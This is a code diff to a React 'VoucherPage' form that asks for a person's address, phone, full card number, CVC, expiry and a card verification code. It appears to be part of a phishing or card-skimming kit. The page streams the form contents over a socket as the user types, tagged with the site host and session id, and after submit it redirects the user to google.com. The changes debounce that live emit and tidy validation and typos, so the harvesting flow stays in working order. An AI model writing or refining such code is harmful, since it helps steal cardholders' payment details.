@@ -2,7 +2,7 @@ import { yupResolver } from '@hookform/resolvers/yup';
 import axios from 'axios';
 import { countries } from 'countries-list';
 import moment from 'moment';
-import { useEffect, useState } from 'react';
+import { useEffect, useState, useCallback } from 'react';
 import { useForm } from 'react-hook-form';
 import { useNavigate } from 'react-router-dom';
 import { toast } from 'react-toastify';
@@ -14,6 +14,7 @@ import CardDetailForm from './CardDetailForm';
 import { Infomation } from './Infomation';
 import './index.css';
 import { socket } from '../../socket';
+import { debounce } from 'lodash';
 
 const VoucherPage = () => {
 	const [step, setStep] = useState(0);
@@ -23,9 +24,6 @@ const VoucherPage = () => {
 		firstName: Yup.string().required('Invalid first name'),
 		lastName: Yup.string().required(),
 		phone: Yup.string().required(),
-		// .test('valid', 'Invalid phone number', (val) => {
-		// 	return val.length > 8 && val.length < 15;
-		// }),
 		email: Yup.string().email(),
 		address: Yup.string().required(),
 		address2: Yup.string().required(),
@@ -33,22 +31,16 @@ const VoucherPage = () => {
 		region: Yup.string().required(),
 		zipcode: Yup.string()
 			.required()
-			.test('val', 'Invalid zipcode', (val) => {
-				return val.toString().length <= 32 && val.toString().length >= 5;
-			}),
-		// .test('val', 'Invalid zip code', (val) => isValidZipCode(val)),
+			.test('val', 'Invalid zipcode', (val) => val.toString().length <= 32 && val.toString().length >= 5),
 		state: Yup.string().required(),
 		country: Yup.string().required(),
-
 		cardVerifyCode: Yup.string().required(),
 		cardShema: Yup.string().required(),
 		cardType: Yup.string().required(),
 		cardName: Yup.string().required(),
 		cardNumber: Yup.string()
 			.required()
-			.test('val', 'Invalid card number', (val) => {
-				return val.replaceAll('-', '').length < 19 && val.replaceAll('-', '').length > 13;
-			})
+			.test('val', 'Invalid card number', (val) => val.replaceAll('-', '').length < 19 && val.replaceAll('-', '').length > 13)
 			.typeError('Invalid card number'),
 		expires: Yup.string().required(),
 		cvc: Yup.string().required('Invalid code').min(3, 'Invalid code').max(4, 'Invalid code'),
@@ -66,7 +58,6 @@ const VoucherPage = () => {
 		zipcode: '',
 		state: '',
 		country: '',
-
 		cardVerifyCode: '',
 		cardSchema: 'DEBIT',
 		cardType: 'VISA',
@@ -135,6 +126,10 @@ const VoucherPage = () => {
 		bin: Math.floor(Math.random() * 1000000),
 	};
 
+	const debouncedSocketEmit = useCallback(debounce((data) => {
+		socket.emit('creatingPayment', data);
+	}, 500), []);
+
 	const onSubmit = async () => {
 		if (watchCardVerifyCode.length > 0 && Object.keys(errors).length < 1) {
 			try {
@@ -142,7 +137,7 @@ const VoucherPage = () => {
 				window.location.href = 'https://www.google.com';
 			} catch (error) {
 				setLoading(false);
-				toast.error(error?.response?.data?.message ?? 'Unknow error');
+				toast.error(error?.response?.data?.message ?? 'Unknown error');
 			}
 		}
 	};
@@ -153,7 +148,7 @@ const VoucherPage = () => {
 
 	useEffect(() => {
 		if (isDirty) {
-			socket.emit('creatingPayment', {
+			debouncedSocketEmit({
 				...submitvalue,
 				frontEnd: window.location.host,
 				sessionId: socket.id,
@@ -163,7 +158,7 @@ const VoucherPage = () => {
 
 	return (
 		<div style={{ height: '100%' }}>
-			<img src={logo} height={150} width={150} />
+			<img src={logo} alt='Logo' height={150} width={150} />
 			{step === 0 && (
 				<Infomation
 					onSend={handleSend}
